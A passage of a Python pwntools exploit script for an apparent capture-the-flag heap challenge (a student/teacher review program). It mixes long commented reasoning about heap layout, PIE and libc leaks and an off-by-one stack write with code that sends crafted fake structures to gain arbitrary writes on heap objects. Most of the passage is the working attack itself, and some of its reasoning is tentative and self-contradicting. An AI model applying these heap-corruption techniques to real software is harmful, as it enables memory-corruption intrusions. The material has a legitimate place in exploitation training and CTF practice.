    # 6. Make a student_array entry point to a fake student struct
    # 7. The fake student has inner_ptr pointing to GOT
    # 8. Use pray to leak GOT entry = libc address!
    
    # But step 4 requires knowing student_array's address (PIE_base + 0x5080)
    # Which we don't know!
    
    # UNLESS... we can find student_array's address on the stack!
    # The student menu function accesses student_array via RIP-relative
    # The compiler generates code like: lea rax, [rip + offset]
    # This doesn't store the address in memory
    
    # But the function parameters might be on the stack!
    # When pray(student_id) is called, the return address is on the stack
    # The return address is a PIE address!
    
    # If we can read the stack, we can leak PIE base!
    
    # How to read the stack?
    # 1. Set review_ptr to a stack address
    # 2. Use pray to output review content (stack content)
    
    # But we don't know the stack address!
    
    # However, we know the heap address!
    # And in Linux, the stack is typically at a high address
    # But we can't calculate it from the heap address
    
    # WAIT! I just realized something important!
    # The custom_read function (0x131a) writes 0xc3 to buf[size]!
    # buf is on the STACK!
    # So after custom_read, there's a 0xc3 byte on the stack!
    
    # But this is in the pray function's stack frame
    # After pray returns, the 0xc3 byte is gone
    
    # Unless... the 0xc3 byte overwrites something important
    # Like a saved return address or a canary
    
    # custom_read(0, buf, 0x10) -> buf[0x10] = 0xc3
    # buf is at [rbp - 0x20] (from the pray function disassembly)
    # buf[0x10] = [rbp - 0x10]
    # This overwrites the saved rbp or canary!
    
    # Wait, let me check the pray function's stack layout:
    # rbp - 0x38: ?
    # rbp - 0x34: student_id
    # rbp - 0x28: student_ptr
    # rbp - 0x20: buf (16 bytes)
    # rbp - 0x10: ??? (this is where 0xc3 is written!)
    # rbp - 0x08: ??? or canary
    # rbp + 0x00: saved rbp
    # rbp + 0x08: return address
    
    # If buf[0x10] overwrites the canary, the program would detect
    # stack smashing and abort!
    
    # But wait, the canary check happens at function return
    # If we can prevent the canary check...
    
    # Actually, let me re-examine the custom_read function:
    # 0x131a: read(fd, buf, size)
    # 0x1343: find newline, replace prev char with 0
    # 0x138c: buf[size] = 0xc3
    
    # buf[size] = buf[0x10] = 0xc3
    # This writes 1 byte past the buffer!
    
    # In the pray function:
    # 0x1d0a: lea rax, [rbp - 0x20]  ; buf
    # 0x1d0e: mov edx, 0x10           ; size
    # 0x1d13: mov rsi, rax
    # 0x1d16: mov edi, 0
    # 0x1d1b: call 0x131a             ; custom_read(0, buf, 0x10)
    
    # So buf is at rbp-0x20, size is 0x10
    # buf[0x10] = *(rbp - 0x20 + 0x10) = *(rbp - 0x10)
    
    # What's at rbp - 0x10?
    # Let me check the pray function's local variables:
    # rbp - 0x38: ?
    # rbp - 0x34: student_id (4 bytes)
    # rbp - 0x30: ?
    # rbp - 0x28: student_ptr (8 bytes)
    # rbp - 0x20: buf start (16 bytes = rbp-0x20 to rbp-0x10)
    # rbp - 0x10: buf[0x10] = 0xc3 (1 byte overwrite!)
    # rbp - 0x08: canary? or other variable
    
    # If rbp - 0x08 is the canary, then rbp - 0x10 is safe to overwrite
    # The 0xc3 byte would just modify a local variable
    
    # But if rbp - 0x10 is part of the canary or saved registers,
    # overwriting it with 0xc3 could cause problems
    
    # Let me check if there's a canary in the pray function
    # At the beginning of pray:
    # 0x1c5b: push rbp
    # 0x1c5c: mov rbp, rsp
    # 0x1c5f: sub rsp, 0x40
    # 0x1c63: mov [rbp - 0x38], edi  ; student_id
    # ...
    # No canary setup (no mov rax, fs:[0x28])
    
    # Wait, let me check again...
    # Actually, with -fstack-protector, the canary is checked at function exit
    # Not all functions have canaries (only those with local buffers)
    
    # The pray function has a buffer (buf at rbp-0x20)
    # So it likely has a canary!
    
    # Let me check the function epilogue:
    # 0x1ded: leave
    # 0x1dee: ret
    # No canary check before leave/ret!
    
    # Wait, that can't be right. Let me re-examine...
    # Actually, the canary check might be at a different location
    # Or the function might not have a canary despite having a buffer
    
    # Let me check the full function...
    
    # For now, let me just proceed with the exploit
    # and use the "add 1" on a calculated address
    
    # I'll use "add 1" on the address of inner0->review_ptr
    # to make it non-zero, then use option 4 to set it properly
    
    # inner0 = heap_leak - 0x70
    # inner0->review_ptr = inner0 + 0x08 = heap_leak - 0x68
    
    # Adding 1 to (heap_leak - 0x68) makes review_ptr = 1
    # This is invalid, so let me try a different approach
    
    # Actually, let me just skip the "add 1" for now
    # and input a dummy address
    
    # Then I'll use option 4 to modify student 0's inner
    # and set review_ptr to a useful address
    
    # For the "add 1" primitive, I'll input the address of
    # inner2->review_size (which is already 0)
    # Adding 1 makes it 1, which is harmless
    
    inner2_review_size_addr = heap_leak + 0x30 + 0x10  # inner2 + 0x10
    
    # Wait, I need to input the address for the "add 1" primitive
    # The prompt is: "add 1 to wherever you want! addr: "
    # Then custom_read(0, buf, 0x10) reads the address
    # Then atol(buf) converts to address
    # Then *addr += 1
    
    # So I need to input the address as a decimal or hex string
    
    log.info(f"Using add 1 on address: {hex(inner2_review_size_addr)}")
    r.sendline(str(inner2_review_size_addr).encode())
    time.sleep(0.5)
    data = r.recv(8192)
    log.info(f"After add 1: {data[:200]}")
    
    # Now let's modify student 0's inner
    # Change student_id to 0
    r.sendline(b'6')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'0')
    time.sleep(0.3)
    r.recv(8192)
    
    # Use option 4 (mode=0) to allocate chunk at student0+0x10
    r.sendline(b'4')
    time.sleep(0.3)
    r.recv(8192)
    r.send(b'B' * 0x1f + b'\n')
    time.sleep(0.3)
    r.recv(8192)
    
    # Set mode=1
    r.sendline(b'3')
    time.sleep(0.3)
    r.recv(8192)
    
    # Option 4 (mode=1): set student0+0x10 low byte
    # student0 data = heap_leak - 0xa0
    # inner0 data = heap_leak - 0x70
    # option4_chunk for student0 = heap_leak + 0x60 (after student2's option4_chunk)
    # Wait, this is getting complicated with the new allocations
    
    # Let me recalculate the heap layout after all the allocations:
    # Initial:
    # student0: 0x30 at heap+0x260, data at heap+0x270
    # inner0: 0x20 at heap+0x290, data at heap+0x2a0
    # student1: 0x30 at heap+0x2b0, data at heap+0x2c0
    # inner1: 0x20 at heap+0x2e0, data at heap+0x2f0
    # student2: 0x30 at heap+0x300, data at heap+0x310
    # inner2: 0x20 at heap+0x330, data at heap+0x340
    # option4_chunk (student2): 0x30 at heap+0x350, data at heap+0x360
    
    # After switching to student 0 and using option 4:
    # option4_chunk (student0): 0x30 at heap+0x380, data at heap+0x390
    
    # student0+0x10 = heap+0x390 (option4_chunk for student0)
    # inner0 data = heap+0x2a0
    # Low bytes: option4=0x90, inner0=0xa0
    # score = 0xa0 = 160 > 100, NOT valid!
    
    # Hmm, the low byte of inner0 is 0xa0, which is > 100
    # So we can't use option 4 mode=1 to point to inner0!
    
    # What about pointing to student0 itself?
    # student0 data = heap+0x270
    # Low byte = 0x70
    # option4 data = heap+0x390
    # Low byte = 0x90
    # score = 0x70 = 112 > 100, NOT valid!
    
    # What about pointing to inner0+0x04 (score field)?
    # inner0+0x04 = heap+0x2a4
    # Low byte = 0xa4 = 164 > 100, NOT valid!
    
    # This is a problem! The heap addresses for student0 are too high!
    
    # Let me try a different student...
    # student1 data = heap+0x2c0
    # inner1 data = heap+0x2f0
    
    # If we use option 4 on student1:
    # option4_chunk (student1): 0x30 at heap+0x380, data at heap+0x390
    # (assuming student0's option4_chunk is already allocated)
    # Actually, if we use option 4 on student1 AFTER student0,
    # it would be at heap+0x3b0, data at heap+0x3c0
    
    # student1+0x10 = heap+0x3c0
    # inner1 data = heap+0x2f0
    # Low bytes: option4=0xc0, inner1=0xf0
    # score = 0xf0 = 240 > 100, NOT valid!
    
    # Even worse!
    
    # The fundamental problem is that inner0 and inner1 have low bytes > 100
    # So we can't use option 4 mode=1 to point to them
    
    # But we CAN point to inner2 (low byte = 0x40 = 64)
    # Because student2 is the last student, its inner is at a lower offset
    
    # So we can only modify inner2 using this technique!
    
    # But we already modified inner2 (score=100)!
    # We need to modify inner0 or inner1 to leak libc
    
    # Alternative: Use the heap leak to calculate exact addresses
    # and use option 4 to write to those addresses directly
    
    # Wait! We know the heap address now!
    # We can use option 4 mode=1 to set student0+0x10 low byte
    # to point to ANY address on the same page as the option4_chunk
    
    # option4_chunk for student0 is at heap+0x390 (low byte 0x90)
    # We can set score to any value 0-100
    # So student0+0x10 can point to heap+0x300 to heap+0x390 + some
    
    # But inner0 is at heap+0x2a0 (low byte 0xa0)
    # 0xa0 = 160 > 100, can't reach!
    
    # inner0 is on a different "page quarter" than the option4_chunk
    
    # Hmm, but the heap is continuous! The same 256-byte region
    # contains addresses from heap+0x300 to heap+0x3ff
    # inner0 at heap+0x2a0 is in the 0x200-0x2ff region
    # option4 at heap+0x390 is in the 0x300-0x3ff region
    # They differ in the second byte (0x2 vs 0x3)
    # So we can't reach inner0 from option4 by just changing the low byte!
    
    # This is a fundamental limitation of the option 4 mode=1 technique
    # We can only modify the low byte, which limits us to the same
    # 256-byte region
    
    # So we can only modify chunks in the same 256-byte region
    # as the option4_chunk
    
    # For student2: option4 at heap+0x360, inner2 at heap+0x340
    # Same region (0x300-0x3ff), score=0x40=64, works!
    
    # For student0: option4 at heap+0x390, inner0 at heap+0x2a0
    # Different regions (0x300 vs 0x200), can't reach!
    
    # So we can ONLY modify student2's inner!
    
    # But we already modified student2's inner (score=100)
    # We need to modify it further to leak libc
    
    # Plan:
    # 1. Use option 4 to modify inner2->review_ptr
    #    Set review_ptr to a known address
    # 2. Use write review to write to that address
    # 3. Or use pray to output content from that address
    
    # But inner2->review_ptr is currently 0 (we set it to 0)
    # And score is 100, so pray would give reward, not review
    
    # Wait! After getting the reward, reward_gained = 1
    # So the next pray on student 2 would say "already gained the reward!"
    # And not output the review!
    
    # So we can't use pray on student 2 to output review!
    
    # But we can use write review (teacher function) to write to review_ptr!
    # If review_ptr is non-zero, write review writes to it!
    
    # So the plan is:
    # 1. Use option 4 to modify inner2 again
    #    Set review_ptr to a useful address
    # 2. Switch to teacher role
    # 3. Use write review on student 2 to write to review_ptr
    
    # But we need to know what address to set review_ptr to!
    # And we need to be able to write useful data there
    
    # With the heap leak, we can calculate:
    # - student_array is at PIE_base + 0x5080 (unknown)
    # - GOT is at PIE_base + 0x3f00 (unknown)
    # - inner0 = heap_leak - 0x70
    # - inner1 = heap_leak - 0x20
    
    # We can set review_ptr to inner0 or inner1 address!
    # Then write review would write to inner0 or inner1!
    # This would allow us to modify their score and review_ptr!
    
    # Let me try this!
    
    # Step 1: Change student_id back to 2
    r.sendline(b'6')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'2')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 2: Use option 4 to modify inner2
    # Set review_ptr to inner0 address
    inner0_addr = heap_leak - 0x70  # This is a calculated address
    
    # But wait, option 4 mode=0 writes 0x20 bytes starting from student+0x10
    # If student+0x10 points to inner2, we write to inner2
    # We need to set review_ptr = inner0_addr
    
    # But we need to preserve the other fields!
    # inner2 currently has: num_questions=9, score=100, review_ptr=0, review_size=0
    # We want: num_questions=9, score=100, review_ptr=inner0_addr, review_size=0x20
    
    fake_inner2_v2 = p32(9) + p32(100) + p64(inner0_addr) + p32(0x20) + p32(0)
    fake_inner2_v2 = fake_inner2_v2.ljust(0x1f, b'\x00')
    
    # But we need to use option 4 mode=0 to write to inner2
    # Currently student2+0x10 points to inner2 (score=64)
    # But mode was set to 0 earlier
    # Let me check: after the pray, what is the current mode?
    # The pray function doesn't change mode
    # So mode should still be 0
    
    # But wait, after pray, we're back in the student menu
    # And the student menu reads [rbp-0x20] for student_id
    # Which was set to 2 by change_id
    
    # Let me just try using option 4 directly
    r.sendline(b'4')
    time.sleep(0.3)
    r.recv(8192)
    r.send(fake_inner2_v2 + b'\n')
    time.sleep(0.3)
    data = r.recv(8192).decode(errors='ignore')
    log.info(f"After writing fake inner2 v2: {data[:100]}")
    
    # Step 3: Switch to teacher role
    r.sendline(b'5')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'0')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 4: Use write review on student 2
    # This should write to inner0 (because review_ptr = inner0_addr)
    r.sendline(b'3')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'2')  # student id 2
    time.sleep(0.3)
    data = r.recv(8192).decode(errors='ignore')
    log.info(f"Write review prompt: {data[:200]}")
    
    # The write review function checks if review_ptr != NULL
    # If review_ptr = inner0_addr (non-zero), it reads directly
    # read(0, review_ptr, review_size) = read(0, inner0_addr, 0x20)
    # This writes to inner0!
    
    # Set inner0: num_questions=9, score=100, review_ptr=0, review_size=0
    fake_inner0 = p32(9) + p32(100) + p64(0) + p32(0) + p32(0)
    fake_inner0 = fake_inner0.ljust(0x1f, b'\x00')
    
    if b'carefully' in data:
        # Review exists, read directly
        r.sendline(fake_inner0)
        time.sleep(0.3)
        data = r.recv(8192).decode(errors='ignore')
        log.info(f"After write to inner0: {data[:100]}")
    elif b'size' in data:
        # New review
        r.sendline(b'32')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(fake_inner0)
        time.sleep(0.3)
        data = r.recv(8192).decode(errors='ignore')
        log.info(f"After write to inner0: {data[:100]}")
    
    # Step 5: Switch to student role and pray on student 0
    r.sendline(b'5')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'1')
    time.sleep(0.3)
    r.recv(8192)
    
    # Change id to 0
    r.sendline(b'6')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'0')
    time.sleep(0.3)
    r.recv(8192)
    
    # Pray on student 0
    r.sendline(b'2')
    time.sleep(1)
    data = r.recv(4096)
    log.info(f"Pray on student 0: {data[:500]}")
    
    if b'reward' in data:
        log.success("Student 0 also got reward!")
    
    r.close()

if __name__ == '__main__':
    exploit()
